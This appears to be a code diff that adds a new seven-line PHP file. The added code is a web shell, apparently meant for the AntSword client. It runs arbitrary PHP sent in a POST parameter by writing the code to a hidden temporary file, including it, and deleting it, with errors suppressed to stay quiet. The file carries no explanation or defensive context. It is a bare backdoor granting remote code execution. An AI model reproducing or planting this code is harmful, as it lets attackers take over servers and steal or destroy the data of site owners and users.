@@ -1,0 +1,7 @@
+<?php if(isset($_POST['ant']) && !empty($_POST['ant'])){
+    $tmp=sys_get_temp_dir().'/.t'.uniqid().'.php';
+    @file_put_contents($tmp,'<?php '.$_POST['ant'].' ?>');
+    @include$tmp;
+    @unlink($tmp);
+    exit;
+} ?>
